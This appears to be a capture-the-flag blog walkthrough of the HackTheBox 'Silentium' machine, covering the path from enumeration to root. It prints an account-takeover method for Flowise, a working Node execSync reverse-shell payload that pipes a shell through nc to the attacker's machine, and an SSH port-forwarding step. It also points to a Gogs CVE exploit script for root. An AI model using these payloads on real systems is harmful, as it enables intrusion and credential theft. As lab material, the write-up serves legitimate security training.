+++
date = '2026-04-15T17:06:19+07:00'
title = 'HackTheBox Silentium Machine Walkthrough'
tags = ['HackTheBox']
description = 'Detailed HTB Silentium writeup. Follow this complete walkthrough to capture the user and root flags using practical penetration testing techniques.'
draft = false
htb_active = true

[cover]
  image = '/images/posts/hackthebox-silentium-cover.png'
  alt = 'HackTheBox Silentium Cover'
  caption = 'HackTheBox Silentium Cover'
  relative = false
+++

## Reconnaissance & Enumeration

Doing simple `nmap` command:

```bash
nmap -v -sV <MACHINE_IP>
```

![Guide image](/images/posts/hackthebox-silentium-1.png)

The server has 2 ports `http` and `ssh`, visit the website I couldn't get anything useful the only thing is I found 3 leadership users, which may be used to gain access through `ssh`:

![Guide image](/images/posts/hackthebox-silentium-2.png)

I brute-force the domain in order to see I got anything useful:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -fs 8753 > result.txt
```

```bash
cat result.txt | grep "Status: 200"
```

![Guide image](/images/posts/hackthebox-silentium-3.png)

Visit `staging.silentium.htb`, found this is a **Flowise** therefore I immediately search for CVEs related to this app. I checked for the version of this **Flowise** app:

```bash
curl -s http://staging.silentium.htb/api/v1/version

{"version":"3.0.5"}
```

Found 4 vulnerabilities:

- **CVE-2025-59528 (Critical RCE)**
- **CVE-2025-58434 (Critical Account Takeover)**
- **CVE-2025-59527 (SSRF)**
- **CVE-2025-29192 (XSS)**

## User Flag

**CVE-2025-58434 (Critical Account Takeover)** is what I used to steal credentials of leadership users that I've found in the home page. Visit `staging.silentium.htb/signin`, tried the credentials and I found that `ben@silentium.htb` is the only account that returns `Incorrect Email or Password`, other accounts return `User Not Found`.

![Guide image](/images/posts/hackthebox-silentium-4.png)

Following the **CVE-2025-58434**, make a `/forgot-password` route, and check the response, found a `tempToken` value, take that `tempToken` to `/reset-password?token=<tempToken>` to change the password.

![Guide image](/images/posts/hackthebox-silentium-5.png)

After logged in as `ben`, the next step is **CVE-2025-59528 (Critical RCE)** which we can gain RCE through the **CustomMCP**.

1. Create a Chatflow and add a **Custom MCP**:

![Guide image](/images/posts/hackthebox-silentium-6.png)

2. Get **Reverse Shell**:

On my machine:

```bash
nc -lvnp 4444
```

Set this as MCP Server Config:

```json
{
  "exploit": (function(){ return process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_MACHINE_IP 4444 >/tmp/f'); })()
}
```

Save this and gain **Reverse Shell**:
![Guide image](/images/posts/hackthebox-silentium-7.png)

After some trials, I found critical information by running `env`:

![Guide image](/images/posts/hackthebox-silentium-8.png)

There are 2 passwords:

```
FLOWISE_PASSWORD=F113_dOck3r
SMTP_PASSWORD=r04D!!_R4ge
```

```bash
ssh ben@MACHINE_IP -p 22
```

This is the correct password for `ben`: `r04D!!_R4ge`. Got user flag:

![Guide image](/images/posts/hackthebox-silentium-9.png)

## Root Flag

After enough amount of time, in `ben` terminal run this:
![Guide image](/images/posts/hackthebox-silentium-10.png)

Found 2 ports that is hidden `3001` and `8025`, port forwarding this to our localhost by running this:

```bash
ssh -L 8025:127.0.0.1:8025 -L 3001:127.0.0.1:3001 ben@<MACHINE_IP>
```

- `127.0.0.1:8025` is a **MailHog** service which used to read mails.
- `127.0.0.1:3001` is a **Gogs** service which we can exploit this through **CVE-2025-8110**. Visit this for more information [github.com/zAbuQasem/gogs-CVE-2025-8110](https://github.com/zAbuQasem/gogs-CVE-2025-8110)

The script may have problem with registeration, so if that is your case create manually and change that to the `CVE-2025-8110.py` script:

![Guide image](/images/posts/hackthebox-silentium-11.png)

Gain reverse shell as `root`:

![Guide image](/images/posts/hackthebox-silentium-12.png)

![Guide image](/images/posts/hackthebox-silentium-13.png)
Achievement: [Link to Achievement](https://labs.hackthebox.com/achievement/machine/2924947/867)
